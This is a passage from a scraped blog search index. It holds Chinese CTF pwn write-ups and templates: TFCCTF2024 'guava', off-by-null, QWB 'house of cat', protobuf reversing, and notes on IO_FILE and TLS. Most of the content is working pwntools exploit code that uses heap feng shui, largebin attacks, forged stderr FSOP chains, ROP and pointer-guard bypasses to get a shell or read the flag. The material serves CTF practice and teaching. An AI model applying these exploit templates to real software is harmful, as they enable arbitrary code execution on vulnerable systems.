def free(index):
    meau(2)
    p.recvuntil(&#39;guava no:&#39;)
    p.sendline(str(index))
while True:
    p = process(&#39;./guava&#39;)
    elf = ELF(&#39;./guava&#39;)
    libc = elf.libc
    add(0x600)#0
    add(0x600)#1
    add(0x600)#2
    add(0x600)#3
    add(0x600)#4
    add(0x600)#5
    add(0x600)#6
    free(0)
    free(1)
    free(2)
    free(3)
    free(4)
    free(5)
    add(0x488)#7
    add(0x488)#8  fake1 0x30
    add(0x498)#9
    add(0x488)#10  fake2 0x20
    free(7)
    free(8)
    free(9)
    free(10)

    add(0x498,0x488,p64(0x31))#11
    add(0x488)#12   end
    add(0x498,0x488,p64(0x21))#13
    add(0x488)#14 start
    free(11)
    free(12)
    free(13)
    free(14)
    free(8)
    free(10)

    add(0x3e8)#15
    add(0x3d8,0xa8,p64(0xdc1))#16
    add(0x608,0x5f8,p64(0x6b1))#17
    add(0x608)#18
    add(0x698)#19
    add(0x698)#20
    add(0x328)#21
    add(0x488)#22 middle
    add(0x328)#23
    free(15)
    free(16)
    free(17)
    free(18)
    free(19)
    free(20)
    add(0x578)#24
    add(0x200)#25
    add(0x308)#26
    add(0x200)#27
    add(0x200)#28
    add(0x200)#29
    add(0x200)#30
    add(0x678)#31
    for i in range(33):
        add(0x5f8)
    add(0x5c0,0x5b0,p64(0x10000)+p64(0x440))#65
    add(0x420)#66
    free(25)
    free(14)
    free(22)
    free(12)
    add(0x200,0x88,p16(0xc080))#67
    add(0x3d8,0xb0,p16(0xc080))#68
    free(67)
    free(68)
    gdb.attach(p,&amp;quot;b *$rebase(0x0000000000015F1)&amp;quot;)
    try:
            add(0x500) # 69
    except:
            p.close()
            continue
    add(0x198)# 70
    add(0x680)# 71
    add(0x680)# 72
    add(0x98)# 73
    add(0x90,0x8,p16(0xb780)) # 74
    try:
        add(0x28,0,p64(0xfbad1800)+p64(0)*3+b&#39;\x00\xb0&#39;) # 75
    except:
        p.close()
        continue
    p.recvuntil(b&#39;\xf0&#39;)
    p.recv(7)
    libc_base = u64(p.recv(6).ljust(8,b&#39;\x00&#39;)) - 2207728
 
    print(hex(libc_base))
 
    # 令 size 为 0x250 的 tcache 指向 _IO_2_1_stderr_
    add(0x100,0x58,p64(libc_base+libc.symbols[&#39;_IO_2_1_stderr_&#39;])) # 76
 
    fake_file = flat({
        0x0: b&amp;quot;  sh;&amp;quot;,
        0x28: libc_base + libc.symbols[&#39;system&#39;],
        0x88: libc_base + libc.symbols[&#39;_environ&#39;]-0x10,
        0xa0: libc_base+libc.symbols[&#39;_IO_2_1_stderr_&#39;]-0x40,   # _wide_data
        0xD8: libc_base + libc.symbols[&#39;_IO_wfile_jumps&#39;], # jumptable
    }, filler=b&amp;quot;\x00&amp;quot;)
 
    # 在 _IO_2_1_stderr_ 上写上我们的 fake file
    add(0x200,0,fake_file)
     
    # 退出程序，执行 fsop 攻击
    meau(3)
    p.sendline(b&#39;cat flag.txt&#39;)
 
    p.interactive()
    break
&lt;/code&gt;&lt;/pre&gt;
">TFCCTF2024</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/gao-ban-ben-off-by-null/"" data-c="
          &lt;p&gt;板子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#构造堆风水
    add(0,0x430)
    add(1,0x20)
    add(2,0x430)
    add(3,0x430)#末尾\x00
    add(4,0x28)
    add(5,0x430)
    add(6,0x430)
    add(7,0x30)
    dele(0)
    dele(3)
    dele(6)
    dele(2)
    add(2,0x870)
    add(6,0x430)
    add(0,0x430)
    dele(2)
    #利用堆残留进行堆指针构造
    add(2,0x450,b&#39;a&#39;*0x438+p32(0x471))
    add(3,0x410)
    dele(0)
    dele(3)
    add(0,0x430,b&#39;a&#39;*8)
    dele(6)
    dele(5)
    add(5,0x870,b&#39;a&#39;*0x438+p64(0x441))
    dele(5)
    add(5,0x4f0)
    add(6,0x370)
    edit(4,b&#39;a&#39;*0x20+p64(0x30+0x440))
    dele(5)
    #此时offbynull利用成功，4号堆块被重叠了
&lt;/code&gt;&lt;/pre&gt;
">高版本off by null</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/qiang-wang-bei-house-of-cat/"" data-c="
          &lt;p&gt;可以说是IO+orw的板子题了，这题是main函数内一直循环，无法通过main函数的正常退出或exit来执行_IO_flush_all_lockp函数刷新文件流，根据house of KIWI，在malloc.c中，assert断言失败，最终都会调用&lt;code&gt;__malloc_assert&lt;/code&gt; ，而其中有一个fflush (stderr)的函数调用，会走&lt;code&gt;stderr&lt;/code&gt;的IO_FILE，最终会调用到其vtable中_IO_file_jumps中的__IO_file_sync，此时rdx为IO_helper_jumps&lt;/p&gt;
&lt;h1 id=&#34;触发io&#34;&gt;触发IO&lt;/h1&gt;
&lt;p&gt;FSOP有三种情况（能从main函数中返回、程序中能执行exit函数、libc中执行abort），第三种情况在高版本中已经删除;__malloc_assert则是在malloc中触发，通常是修改top chunk的大小。&lt;/p&gt;
&lt;h1 id=&#34;__malloc_assert&#34;&gt;__malloc_assert&lt;/h1&gt;
&lt;p&gt;house of kiwi提供了一种调用该函数的思路，可以通过修改topchunk的大小触发，即满足下列条件中的一个&lt;br&gt;
1.topchunk的大小小于MINSIZE(0X20)&lt;br&gt;
2.prev inuse位为0&lt;br&gt;
3.old_top页未对齐&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;assert ((old_top == initial_top (av) &amp;amp;&amp;amp; old_size == 0) ||
        ((unsigned long) (old_size) &amp;gt;= MINSIZE &amp;amp;&amp;amp;
         prev_inuse (old_top) &amp;amp;&amp;amp;
         ((unsigned long) old_end &amp;amp; (pagesize - 1)) == 0));
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;题目信息&#34;&gt;题目信息&lt;/h1&gt;
&lt;p&gt;(&lt;s&gt;省去了逆向内容，主要是学习板子&lt;/s&gt;)该题提供了UAF漏洞和两次edit，限制了堆块数目不超过15个，限制了堆块大小[0x418,0x470)，开了沙盒只能orw且read的第一个参数只能是0，所以需要先close(0)，再open，并且限制了edit的输入大小（不超过0x30）,所以只能提前用add布置好fake io和rop链&lt;/p&gt;
&lt;h1 id=&#34;劫持的调用链&#34;&gt;劫持的调用链：&lt;/h1&gt;
&lt;p&gt;__malloc_assert&lt;br&gt;
---&amp;gt;__fxprintf&lt;br&gt;
-------&amp;gt;_IO_wfile_jumps的vtable&lt;br&gt;
-----------&amp;gt;_IO_wfile_seekoff&lt;br&gt;
---------------&amp;gt;_IO_switch_to_wget_mode&lt;/p&gt;
&lt;h1 id=&#34;攻击思路house-of-cat&#34;&gt;攻击思路（house of cat）：&lt;/h1&gt;
&lt;p&gt;通过第一次largebin attack劫持stderr，然后控制vtable为_IO_wfile_jumps+0x10，劫持_IO_wfile_seekoff为magic_gadget，将rbp转移到rop上，然后利用call调用leave ret执行rop链，最后通过第二次llargebin attack部分改写top chunk（将其改小），然后调用malloc即可触发__malloc_assert打印出flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context.log_level = &#39;debug&#39;
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)

#p = remote(&#39;43.142.108.3&#39;, 28290)
p = process(&#39;./house_of_cat&#39;)
elf = ELF(&#39;./house_of_cat&#39;)
libc = elf.libc


def s(x): return p.send(x)
def sa(x, y): return p.sendafter(x, y)
def sla(x, y): return p.sendlineafter(x, y)
def sl(x): return p.sendline(x)
def rv(): return p.recv()
def ru(x): return p.recvuntil(x)
def rvl(): return p.recvline()
def lg(x, y): return log.info(f&#39;{x} =&amp;gt; {hex(y)}&#39;)


sa(b&#39;mew mew mew~~~~~~&#39;, b&#39;LOGIN | r00t QWB QWXFadmin&#39;)


def add(idx, size, data = b&#39;\x00&#39;):  # [0x418,0x470)
    sa(&#39;mew mew mew~~~~~~&#39;, &#39;CAT | r00t QWB QWXF$\xff&#39;)
    sla(&#39;plz input your cat choice:\n&#39;, b&#39;1&#39;)
    sla(&#39;plz input your cat idx:\n&#39;, str(idx))
    sla(&#39;plz input your cat size:\n&#39;, str(size))
    sa(&#39;plz input your content:\n&#39;, data)


def delete(idx):  # uaf
    sa(&#39;mew mew mew~~~~~~&#39;, &#39;CAT | r00t QWB QWXF$\xff&#39;)
    sla(&#39;plz input your cat choice:\n&#39;, b&#39;2&#39;)
    sla(&#39;plz input your cat idx:\n&#39;, str(idx))


def show(idx):
    sa(&#39;mew mew mew~~~~~~&#39;, &#39;CAT | r00t QWB QWXF$\xff&#39;)
    sla(&#39;plz input your cat choice:\n&#39;, b&#39;3&#39;)
    sla(&#39;plz input your cat idx:\n&#39;, str(idx))


def edit(idx, data):
    sa(&#39;mew mew mew~~~~~~&#39;, &#39;CAT | r00t QWB QWXF$\xff&#39;)
    sla(&#39;plz input your cat choice:\n&#39;, b&#39;4&#39;)
    sla(&#39;plz input your cat idx:\n&#39;, str(idx))
    sa(&#39;plz input your content:\n&#39;, data)


add(0xe,0x450,&#39;a&#39;)
add(0xd,0x450,&#39;a&#39;)
delete(0xe)
add(0xc,0x460,&#39;a&#39;)
show(0xe)
p.recvuntil(&#39;Context:\n&#39;)
p.recv(8)
libc_base=u64(p.recv(6).ljust(8, b&#39;\0&#39;))-0x21a0e0
p.recv(10)
large = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
heap_base=large-0x290
IO_list_all=libc_base+libc.symbols[&#39;_IO_list_all&#39;]
magic_gadget=libc_base+0x16a1fa
&amp;quot;&amp;quot;&amp;quot;
&amp;lt;svcudp_reply+26&amp;gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&amp;lt;svcudp_reply+30&amp;gt;:    mov    rax,QWORD PTR [rbp+0x18]
&amp;lt;svcudp_reply+34&amp;gt;:    lea    r13,[rbp+0x10]
&amp;lt;svcudp_reply+38&amp;gt;:    mov    DWORD PTR [rbp+0x10],0x0
&amp;lt;svcudp_reply+45&amp;gt;:    mov    rdi,r13
&amp;lt;svcudp_reply+48&amp;gt;:    call   QWORD PTR [rax+0x28]
&amp;quot;&amp;quot;&amp;quot;
leave_ret=libc_base+0x00000000000562ec
add_rsp_ret=libc_base+0x000000000003a889
stderr_ptr=0x21a860+libc_base
lock=libc_base+0x21ba60
pop_rdi=libc_base+0x000000000002a3e5
pop_rsi=libc_base+0x000000000002be51
pop_rdx_r12=libc_base+0x000000000011f497
pop_rax_ret=libc_base+0x0000000000045eb0
ret = libc_base+0x0000000000029cd6
syscall=libc_base+0xea5b9
read_addr=libc_base+libc.symbols[&#39;read&#39;]
write_addr=libc_base+libc.symbols[&#39;write&#39;]
close_addr=libc_base+libc.symbols[&#39;close&#39;]

add(0xb,0x450,&#39;a&#39;)

fake_io_addr = heap_base + 0xfc0
flag_str_addr = fake_io_addr + 0x1a8
flag_content_addr = heap_base + 0x600
setcontext = libc_base + libc.sym[&#39;setcontext&#39;]
_IO_wfile_jumps = libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;]
rop_chain = p64(pop_rdi) + p64(flag_str_addr) + p64(libc.sym[&#39;open&#39;]) #open(&amp;quot;./flag.txt&amp;quot;,0);
rop_chain += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_content_addr) + p64(pop_rdx_r12) + p64(0x50) + p64(0) + p64(libc.sym[&#39;read&#39;])#read(3,flag_addr2,0x50);
rop_chain += p64(pop_rdi) + p64(1) + p64(libc.sym[&#39;write&#39;])#write(1,flag_addr2,0x50);


#close
rop=p64(pop_rdi)
rop+=p64(0)
rop+=p64(close_addr)

#open
rop+=p64(pop_rdi)
rop+=p64(flag_str_addr)# &#39;flag&#39; address
rop+=p64(pop_rsi)
rop+=p64(0)
rop+=p64(pop_rax_ret)
rop+=p64(2)
rop+=p64(syscall)

#read
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rsi)
rop+=p64(flag_content_addr)# flag store address
rop+=p64(pop_rdx_r12)
rop+=p64(0x50)
rop+=p64(0)
rop+=p64(read_addr)

#write
rop+=p64(pop_rdi)
rop+=p64(1)
rop+=p64(pop_rsi)
rop+=p64(flag_content_addr)# flag store address
rop+=p64(pop_rdx_r12)
rop+=p64(0x50)
rop+=p64(0)
rop+=p64(write_addr)


fake_stderr = flat({
    0x38: p64(fake_io_addr+0x1f0),
    0x78: p64(lock),
    0x90: p64(fake_io_addr+0xe0),
    0xc8: p64(_IO_wfile_jumps + 0x10),
    0xf0: p64(1),
    0x198: b&amp;quot;flag\x00\x00\x00\x00&amp;quot;,
    0x1b0: p64(fake_io_addr+0x1b0),
    0x1b8: p64(magic_gadget),
    0x1e0: p64(0xdeadbeef),
    0x1e8: p64(add_rsp_ret),
    0x1f0: p64(0xdeadbeef),
    0x1f8: p64(0x1e8+fake_io_addr),
    0x200: p64(leave_ret),
    #rop
    0x208:rop
},filler=b&#39;\00&#39;)


# fake_io_addr = heap_base + 0xfc0
# wide_data=p64(0)*4+p64(1)
# wide_data+=p64(0)*20
# wide_data+=b&amp;quot;flag\x00\x00\x00\x00&amp;quot;
# wide_data+=p64(0)
# wide_data+=p64(0)
# wide_data+=p64(fake_io_addr+0x1b0)#wide_vtable
# wide_data+=p64(magic_gadget)#first call
# wide_data+=p64(0)*3
# wide_data+=p64(0)#                        rax即0x1178+0x30+heap_base
# wide_data+=p64(0xdeadbeef)#                   rbp即heap_base+0x1180+0x30
# wide_data+=p64(add_rsp_ret)      #        add    rsp,0x18
# wide_data+=p64(0xdeadbeef)
# wide_data+=p64(0x1e8+fake_io_addr)#   [rbp+0x18]  
# wide_data+=p64(leave_ret)          #second call  [rax+0x28]
# wide_data+=rop


# io_file=p64(0)*7
# io_file+=p64(fake_io_addr+0x1f0)#  rbp   io_save_base   [rdi+0x48]   
# io_file+=p64(0)*7
# io_file+=p64(lock)+p64(0)*2
# io_file+=p64(fake_io_addr+0xe0)#wide_data
# io_file+=p64(0)*6
# io_file+=p64(libc_base+0x2160c0+0x10)#vtable   _IO_wfile_jumps+0x10
# io_file+=wide_data



add(0,0x428,fake_stderr)#0xwfile 2160c0
add(0xf,0x460,&#39;prevent merge chunk&#39;)
add(1,0x418,&#39;a&#39;)
delete(0)
add(2,0x460,&#39;a&#39;)
edit(0,p64(libc_base+0x21a0d0)*2+p64(0)+p64(stderr_ptr-0x20))
delete(1)
add(3,0x440,&#39;large bin attack chunk&#39;)

add(4,0x418,&#39;a&#39;)
print(&#39;libc_base&#39;,hex(libc_base))
print(&#39;heap_base&#39;,hex(heap_base))
print(&#39;stderr_ptr&#39;,hex(stderr_ptr))
print(&#39;_IO_wfile_jumps&#39;,hex(_IO_wfile_jumps + 0x10))
print(&#39;fake_io_addr&#39;,hex(fake_io_addr))
gdb.attach(p)


# second large bin attack
add(7,0x460,&#39;a&#39;)
add(8,0x430,&#39;a&#39;)

delete(3)
add(9,0x460,&#39;a&#39;)
edit(3,p64(large)+p64(large)+p64(0)+p64(0x3265-2+heap_base-0x20))
delete(8)

p.sendafter(&amp;quot;mew mew mew~~~~~~\n&amp;quot;,&#39;CAT | r00t QWB QWXF$\xff&#39;)
p.sendlineafter(&amp;quot;plz input your cat choice:\n&amp;quot;,str(1))
p.sendlineafter(&amp;quot;plz input your cat idx:\n&amp;quot;,str(6))
p.sendlineafter(&amp;quot;plz input your cat size:\n&amp;quot;,str(0x46f))
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;板子&#34;&gt;板子：&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;magic_gadget=libc_base+0x16a1fa
&amp;quot;&amp;quot;&amp;quot;
&amp;lt;svcudp_reply+26&amp;gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&amp;lt;svcudp_reply+30&amp;gt;:    mov    rax,QWORD PTR [rbp+0x18]
&amp;lt;svcudp_reply+34&amp;gt;:    lea    r13,[rbp+0x10]
&amp;lt;svcudp_reply+38&amp;gt;:    mov    DWORD PTR [rbp+0x10],0x0
&amp;lt;svcudp_reply+45&amp;gt;:    mov    rdi,r13
&amp;lt;svcudp_reply+48&amp;gt;:    call   QWORD PTR [rax+0x28]
&amp;quot;&amp;quot;&amp;quot;
fake_io_addr = heap_base + 0xfc0
flag_str_addr = fake_io_addr + 0x1a8
flag_content_addr = heap_base + 0x600
setcontext = libc_base + libc.sym[&#39;setcontext&#39;]
_IO_wfile_jumps = libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;]
rop_chain = p64(pop_rdi) + p64(flag_str_addr) + p64(libc.sym[&#39;open&#39;]) #open(&amp;quot;./flag.txt&amp;quot;,0);
rop_chain += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_content_addr) + p64(pop_rdx_r12) + p64(0x50) + p64(0) + p64(libc.sym[&#39;read&#39;])#read(3,flag_addr2,0x50);
rop_chain += p64(pop_rdi) + p64(1) + p64(libc.sym[&#39;write&#39;])#write(1,flag_addr2,0x50);

#close
rop=p64(pop_rdi)
rop+=p64(0)
rop+=p64(close_addr)

#open
rop+=p64(pop_rdi)
rop+=p64(flag_str_addr)# &#39;flag&#39; address
rop+=p64(pop_rsi)
rop+=p64(0)
rop+=p64(pop_rax_ret)
rop+=p64(2)
rop+=p64(syscall)

#read
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rsi)
rop+=p64(flag_content_addr)# flag store address
rop+=p64(pop_rdx_r12)
rop+=p64(0x50)
rop+=p64(0)
rop+=p64(read_addr)

#write
rop+=p64(pop_rdi)
rop+=p64(1)
rop+=p64(pop_rsi)
rop+=p64(flag_content_addr)# flag store address
rop+=p64(pop_rdx_r12)
rop+=p64(0x50)
rop+=p64(0)
rop+=p64(write_addr)
fake_stderr = flat({
    0x38: p64(fake_io_addr+0x1f0),#  rbp   io_save_base   [rdi+0x48]   
    0x78: p64(lock),
    0x90: p64(fake_io_addr+0xe0),#wide_data
    0xc8: p64(_IO_wfile_jumps + 0x10),#vtable   _IO_wfile_jumps+0x10
    0xf0: p64(1),
    0x198: b&amp;quot;flag\x00\x00\x00\x00&amp;quot;,
    0x1b0: p64(fake_io_addr+0x1b0),#wide_vtable
    0x1b8: p64(magic_gadget),#first call
    0x1e0: p64(0xdeadbeef),#                   rbp即heap_base+0x1180+0x30
    0x1e8: p64(add_rsp_ret), #add    rsp,0x18
    0x1f0: p64(0xdeadbeef),
    0x1f8: p64(0x1e8+fake_io_addr),#   [rbp+0x18]  
    0x200: p64(leave_ret), #second call  [rax+0x28]
    #rop
    0x208:rop
},filler=b&#39;\00&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另一种形式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fake_io_addr = heap_base + 0xfc0

wide_data=p64(0)*4+p64(1)
wide_data+=p64(0)*20
wide_data+=b&amp;quot;flag\x00\x00\x00\x00&amp;quot;
wide_data+=p64(0)
wide_data+=p64(0)
wide_data+=p64(fake_io_addr+0x1b0)#wide_vtable
wide_data+=p64(magic_gadget)#first call
wide_data+=p64(0)*3
wide_data+=p64(0)#                        rax即0x1178+0x30+heap_base
wide_data+=p64(0xdeadbeef)#                   rbp即heap_base+0x1180+0x30
wide_data+=p64(add_rsp_ret)      #        add    rsp,0x18
wide_data+=p64(0xdeadbeef)
wide_data+=p64(0x1e8+fake_io_addr)#   [rbp+0x18]  
wide_data+=p64(leave_ret)          #second call  [rax+0x28]
wide_data+=rop


io_file=p64(0)*7
io_file+=p64(fake_io_addr+0x1f0)#  rbp   io_save_base   [rdi+0x48]   
io_file+=p64(0)*7
io_file+=p64(lock)+p64(0)*2
io_file+=p64(fake_io_addr+0xe0)#wide_data
io_file+=p64(0)*6
io_file+=p64(libc_base+0x2160c0+0x10)#vtable   _IO_wfile_jumps+0x10
io_file+=wide_data
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;详细参数版：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fake_struct = p64(0) #_IO_read_end
fake_struct += p64(0) #_IO_read_base
fake_struct += p64(0) #_IO_write_base
fake_struct += p64(0) #_IO_write_ptr
fake_struct += p64(0) #_IO_write_end
fake_struct += p64(0) #_IO_buf_base
fake_struct += p64(1) #_IO_buf_end
fake_struct += p64(0) #_IO_save_base
fake_struct += p64(fake_io_addr + 0xb0) #_IO_backup_base = rdx
fake_struct += p64(setcontext + 61) #_IO_save_end = call_addr
fake_struct += p64(0)  #_markers
fake_struct += p64(0)  #_chain
fake_struct += p64(0)  #_fileno
fake_struct += p64(0)  #_old_offset
fake_struct += p64(0)  #_cur_column
fake_struct += p64(heap_base + 0x200) #_lock = heap_addr or writeable libc_addr
fake_struct += p64(0) #_offset
fake_struct += p64(0) #_codecvx
fake_struct += p64(fake_io_addr + 0x30) #_wfile_data rax1
fake_struct += p64(0) #_freers_list
fake_struct += p64(0) #_freers_buf
fake_struct += p64(0) #__pad5
fake_struct += p32(0) #_mode
fake_struct += b&amp;quot;\x00&amp;quot;*20 #_unused2
fake_struct += p64(_IO_wfile_jumps + 0x10) #vatable
fake_struct += p64(0)*6 #padding
fake_struct += p64(fake_io_addr + 0x40) #rax2 -&amp;gt; to make [rax+0x18] = setcontext + 61
&lt;/code&gt;&lt;/pre&gt;
">[强网杯]house of cat</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/protobuf/"" data-c="
          &lt;p&gt;&lt;a href=&#34;https://zzkkk1h.github.io/wp/ciscn2024%E5%88%9D%E8%B5%9B-Pwn-wp/index.html&#34;&gt;学习链接&lt;/a&gt;&lt;br&gt;
例题为ciscn2024初赛的ezbuf&lt;/p&gt;
&lt;h1 id=&#34;pbtk逆向协议&#34;&gt;pbtk逆向协议&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;cd pbtk
./gui.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;选择第一个选项&lt;/p&gt;
&lt;h1 id=&#34;手动逆向协议&#34;&gt;手动逆向协议&lt;/h1&gt;
&lt;p&gt;魔数：0x28AAEEF9&lt;br&gt;
恢复的结构体（选中数据,alt+Q）：&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1722338352659.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
如果n_fileds为5,表明其中含有5个变量，点进fields分析每个field&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;typedef enum {
	PROTOBUF_C_TYPE_INT32,      /**&amp;lt; int32 */
	PROTOBUF_C_TYPE_SINT32,     /**&amp;lt; signed int32 */
	PROTOBUF_C_TYPE_SFIXED32,   /**&amp;lt; signed int32 (4 bytes) */
	PROTOBUF_C_TYPE_INT64,      /**&amp;lt; int64 */
	PROTOBUF_C_TYPE_SINT64,     /**&amp;lt; signed int64 */
	PROTOBUF_C_TYPE_SFIXED64,   /**&amp;lt; signed int64 (8 bytes) */
	PROTOBUF_C_TYPE_UINT32,     /**&amp;lt; unsigned int32 */
	PROTOBUF_C_TYPE_FIXED32,    /**&amp;lt; unsigned int32 (4 bytes) */
	PROTOBUF_C_TYPE_UINT64,     /**&amp;lt; unsigned int64 */
	PROTOBUF_C_TYPE_FIXED64,    /**&amp;lt; unsigned int64 (8 bytes) */
	PROTOBUF_C_TYPE_FLOAT,      /**&amp;lt; float */
	PROTOBUF_C_TYPE_DOUBLE,     /**&amp;lt; double */
	PROTOBUF_C_TYPE_BOOL,       /**&amp;lt; boolean */
	PROTOBUF_C_TYPE_ENUM,       /**&amp;lt; enumerated type */
	PROTOBUF_C_TYPE_STRING,     /**&amp;lt; UTF-8 or ASCII string */
	PROTOBUF_C_TYPE_BYTES,      /**&amp;lt; arbitrary byte sequence */
	PROTOBUF_C_TYPE_MESSAGE,    /**&amp;lt; nested message */
} ProtobufCType;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;field：&lt;img src=&#34;https://l1u66.github.io//post-images/1722339033167.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
光标上一行的0xf即该field的PROTOBUF_C_TYPE_BYTES（bytes）类型（ProtobufCType从上往下，从0开始），名为whatcon，按照这样的方法依次提取出所有field，写到heybro.proto文件中&lt;br&gt;
这里的heybro来自于结构体的name&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1722339333688.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;syntax=&amp;quot;proto3&amp;quot;; //proto version 2 or 3

message heybro{
    bytes whatcon = 1;
    sint64 whattodo = 2;
    sint64 whatidx = 3;
    sint64 whatsize = 4;
    uint32 whatsthis = 5;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;利用&lt;code&gt;protoc heybro.proto --python_out=./&lt;/code&gt;命令生成python语言的代码，得到一个python文件，可以在exp中导入，构建相应的protobuf包&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import heybro_pb2 # 不要加.py
data = heybro_pb2.heybro() # 方法名称跟随.proto中结构体名称变化
data.whattodo = todo
data.whatcon = content
data.whatidx = index
data.whatsize = size
data.whatsthis = this
data.SerializeToString() # 转换成bytes
&lt;/code&gt;&lt;/pre&gt;
">protobuf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/suo-sui-zhi-shi-dian/"" data-c="
          &lt;h1 id=&#34;io偏移表&#34;&gt;IO偏移表&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;tls&#34;&gt;TLS&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;在gdb里使用&lt;code&gt;fsbase&lt;/code&gt;命令可以找到TLS结构体的地址&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p &amp;amp;tls_dtor_list&lt;/code&gt;找到tls_dtor_list&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;直接拿到shell&#34;&gt;直接拿到shell：&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;ROL = lambda val, r_bits, max_bits: \
    (val &amp;lt;&amp;lt; r_bits%max_bits) &amp;amp; (2**max_bits-1) | \
    ((val &amp;amp; (2**max_bits-1)) &amp;gt;&amp;gt; (max_bits-(r_bits%max_bits)))
 
# 两次largebin attack改tls_dtor_list与pointer_guard
 
fake_pointer_guard = heap_base + 0x17b0
edit(0, b&#39;a&#39;*0x420 + p64(ROL(libc.sym[&#39;system&#39;] ^ fake_pointer_guard, 0x11, 64)) + p64(next(libc.search(b&#39;/bin/sh&#39;))))
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;rop&#34;&gt;rop:&lt;/h2&gt;
&lt;p&gt;把tls_dtor_list的头节点写为一个堆地址heap_address_ctr，然后在heap_address_ctr写入leave ret的gadget指针，这样，call rax 后，rip 指向了heap_address_ctr +8，我们就完成了栈的劫持，我们可以在这里布置rop。&lt;/p&gt;
&lt;h1 id=&#34;pie&#34;&gt;PIE&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;gdb.attach(io,&amp;quot;b *$rebase(0x16cc)&amp;quot;)&lt;/code&gt;开启pie下断点&lt;/p&gt;
&lt;h1 id=&#34;脚本dump-seccomp-tools&#34;&gt;脚本dump seccomp-tools&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;process(&amp;quot;seccomp-tools dump ./test&amp;quot;,shell=True)&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;magic-gadgets&#34;&gt;magic gadgets&lt;/h1&gt;
&lt;h2 id=&#34;svcudp_reply&#34;&gt;svcudp_reply&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;svcudp_reply+26&amp;gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&amp;lt;svcudp_reply+30&amp;gt;:    mov    rax,QWORD PTR [rbp+0x18]
&amp;lt;svcudp_reply+34&amp;gt;:    lea    r13,[rbp+0x10]
&amp;lt;svcudp_reply+38&amp;gt;:    mov    DWORD PTR [rbp+0x10],0x0
&amp;lt;svcudp_reply+45&amp;gt;:    mov    rdi,r13
&amp;lt;svcudp_reply+48&amp;gt;:    call   QWORD PTR [rax+0x28]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;ROPgadget --binary &#39;/home/tutu/桌面/pwn/houseofcat/libc.so.6&#39; --opcode 488b6f48488b4518&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;setcontext&#34;&gt;setcontext&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt; 0x7fe165955a6d &amp;lt;setcontext+61&amp;gt;     mov    rsp, qword ptr [rdx + 0xa0]
   0x7fe165955a74 &amp;lt;setcontext+68&amp;gt;     mov    rbx, qword ptr [rdx + 0x80]
   0x7fe165955a7b &amp;lt;setcontext+75&amp;gt;     mov    rbp, qword ptr [rdx + 0x78]
   0x7fe165955a7f &amp;lt;setcontext+79&amp;gt;     mov    r12, qword ptr [rdx + 0x48]
   0x7fe165955a83 &amp;lt;setcontext+83&amp;gt;     mov    r13, qword ptr [rdx + 0x50]
